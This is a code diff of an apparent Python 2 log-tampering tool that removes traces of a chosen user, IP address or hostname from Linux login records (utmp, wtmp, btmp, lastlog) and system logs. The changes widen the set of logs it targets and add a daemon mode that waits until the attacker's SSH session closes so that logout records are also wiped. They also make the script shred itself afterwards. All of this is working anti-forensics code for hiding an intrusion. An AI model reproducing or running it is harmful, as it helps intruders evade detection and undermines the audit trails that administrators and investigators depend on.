@@ -21,23 +21,21 @@ import argparse
 import datetime
 import os
 import platform
+import pwd
 import random
 import socket
 import struct
 import subprocess
 import sys
+import time
 
-try:  # Does not exist on Windows
-    import pwd
-except ImportError:
-    pwd = None
 
 VERBOSE = False
 CHECK_MODE = False
 
 LINUX_UTMP_FILES = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"]
 LINUX_LASTLOG_FILE = "/var/log/lastlog"
-LINUX_ADDITIONAL_LOGS = ["/var/log/syslog"]
+LINUX_ADDITIONAL_LOGS = ["/var/log/syslog", "/var/log/messages", "/var/log/secure"]
 UTMP_BLOCK_SIZE = 384  # Might vary depending on the distribution
 LASTLOG_BLOCK_SIZE = 292
 UTMP_UNPACK_STRING = "hi32s4s32s256s2h3i36x"
@@ -60,6 +58,11 @@ def random_string(size):
 # -----------------------------------------------------------------------------
 
 def ask_confirmation(message):
+    """
+    Displays a prompts to the user so they can confirm or stop an action.
+    :param message:  The action which is about to be attempted.
+    :return: Whether the program should proceed or not.
+    """
     answers = {"y": True, "yes": True, "n": False, "no": False}
     while True:
         response = raw_input("[ ] %s Confirm? [Y/n] " % message).lower()
@@ -159,7 +162,11 @@ def proper_overwrite(source, destination):
                     % destination)
         return False
 
-    os.system("cat %s > %s" % (source, destination))
+    ret = os.system("cat %s > %s" % (source, destination))
+    if ret != 0:
+        if VERBOSE:
+            print warning("Command \"cat %s > %s\" failed!" % (source, destination))
+        return False
     return True
 
 # -----------------------------------------------------------------------------
@@ -330,6 +337,8 @@ def clean_generic_logs(files, ip, hostname):
         additional_files = LINUX_ADDITIONAL_LOGS
     targets = set(filter(lambda x: x.strip(), var_logs.split('\n')) + files + additional_files)
     for log in targets:
+        if not os.path.exists(log):  # One of the additional files (i.e. /var/log/secure doesn't exist. Ignore.
+            continue
         if not os.access(log, os.R_OK | os.W_OK):
             if VERBOSE:
                 print warning("Unable to read or write to %s! Skipping..." % log)
@@ -365,6 +374,45 @@ def clean_generic_logs(files, ip, hostname):
 ###############################################################################
 # "Main" section
 ###############################################################################
+
+def daemonize():
+    """
+    This function will daemonize the script and continue executing it only
+    when the current session will have ended.
+    The rationale behind this is to clean logs after the caller has disconnected from
+    the machine in order to catch SSG logout records (for instance).
+    :return:
+    """
+    def fork():
+        try:
+            pid = os.fork()
+            if pid > 0:
+                # Exit parent
+                sys.exit(0)
+        except OSError as e:
+            print "Error while forking! (%s)" % e.message
+            sys.exit(1)
+
+    # Double fork to daemonize
+    fork()
+    os.chdir('/')
+    os.setsid()
+    os.umask(0)
+    fork()
+
+    print success("The script has daemonized successfully. Logs will be cleaned when this "
+                  "session ends.")
+
+    # Dirty trick to figure out when the user has disconnected from the current session:
+    # try to use the file descriptor for stdout and detect when it is closed.
+    while True:
+        time.sleep(10)
+        try:
+            os.ttyname(1)
+        except:     # Exception caught: stdout doesn't exist anymore.
+            return  # This means the session has ended and we can proceed.
+
+# -----------------------------------------------------------------------------
 
 def validate_args(args):
     """
@@ -405,13 +453,26 @@ def validate_args(args):
         if not sys.stdin.isatty():
             print error("Cannot ask for confirmation without a TTY. Please rerun without --check.")
             sys.exit(1)
+        if args.daemonize:
+            print error("The --check option is incompatible with --daemonize.")
+            sys.exit(1)
         CHECK_MODE = True
 
+    # Assert that the given log files can be read and written to, otherwise they can't be tampered with.
     if args.log_files is not None:
         for log in args.log_files:
             if not os.path.exists(log):
                 print error("%s does not exist!" % log)
                 sys.exit(1)
+            if not os.access(log, os.R_OK | os.W_OK):
+                print error("%s is either not readable or not writable!" % log)
+                sys.exit(1)
+
+    if args.daemonize:
+        if not sys.stdin.isatty():
+            print error("Cannot detect session termination without a TTY! Please disable the --daemonize option.")
+            sys.exit(1)
+        daemonize()
 
 # -----------------------------------------------------------------------------
 
@@ -423,6 +484,8 @@ if __name__ == "__main__":
     parser.add_argument("--verbose", "-v", help="Print debug messages.", action="store_true")
     parser.add_argument("--check", "-c", help="If present, the user will be asked to confirm each deletion from the "
                                               "logs.", action="store_true")
+    parser.add_argument("--daemonize", "-d", help="Start in the background and delete logs when the current session "
+                                                  "terminates. This script will then delete itself.", action="store_true")
     parser.add_argument("log_files", nargs='*', help="Specify any log files to clean in addition to /var/**/*.log.")
     args = parser.parse_args()
     validate_args(args)
@@ -440,6 +503,10 @@ if __name__ == "__main__":
             clean_utmp(log, args.user, args.ip, args.hostname)
         clean_lastlog(LINUX_LASTLOG_FILE, args.user, args.ip, args.hostname)
     else:
-        print error("UTMP/WTMP/lastlog cannot be cleaned on %s :(" % system)
+        print error("UTMP/WTMP/lastlog/dmesg cannot be cleaned on %s :(" % system)
 
     clean_generic_logs(args.log_files, args.ip, args.hostname)
+
+    # If we daemonized to remove the logs after the user disconnects, also shred this script.
+    if args.daemonize:
+        secure_delete(sys.argv[0])
